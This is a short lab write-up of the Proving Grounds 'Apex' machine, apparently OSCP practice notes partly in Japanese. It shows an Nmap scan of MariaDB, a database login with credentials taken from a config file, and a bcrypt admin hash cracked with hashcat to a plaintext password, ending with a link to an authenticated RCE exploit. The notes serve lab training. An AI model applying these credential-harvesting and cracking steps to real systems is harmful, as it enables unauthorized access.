# Nmap

```zsh
PORT   STATE SERVICE REASON  VERSION
3306/tcp open  mysql       MariaDB 5.5.5-10.1.48
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 42
|   Capabilities flags: 63487
|   Some Capabilities: Speaks41ProtocolNew, LongPassword, Support41Auth, SupportsCompression, SupportsTransactions, FoundRows, LongColumnFlag, IgnoreSigpipes, ODBCClient, InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: qZO]gmlWNc'7}2!L:~.g
|_  Auth Plugin Name: mysql_native_password
```

---

# Enumeration

- sqlconf.phpで入手した認証情報とデータベース情報（openemr）を利用して機密情報を入手できないか検証
```sh
┌──(koshi㉿kali)-[~/ProvingGrounds/Apex/Payloads]
└─$ mysql -u openemr -h $TargetIP -p --skip-ssl
```
![[Pasted image 20260214165811.png]]

- hashidでハッシュタイプを特定
```sh
┌──(koshi㉿kali)-[~/ProvingGrounds/Apex/Payloads]
└─$ echo -n '$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC' > admin_hash.txt

┌──(koshi㉿kali)-[~/ProvingGrounds/Apex/Payloads]
└─$ hashid admin_hash.txt                                                              
--File 'admin_hash.txt'--
Analyzing '$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
--End of file 'admin_hash.txt'--   
```

- クラック
```sh
┌──(koshi㉿kali)-[~/ProvingGrounds/Apex/Payloads]
└─$ hashcat admin_hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt --force
hashcat (v7.1.2) starting
...
$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC:thedoctor
                                                          
Session..........: hashcat
Status...........: Cracked
```

- ログイン成功
![[Pasted image 20260214170634.png]]

- Authenticated RCEを使う → [[OSCP/Lab_Writeup/Proving_Grounds/Apex/Exploit|Exploit]]

---

# Screenshot


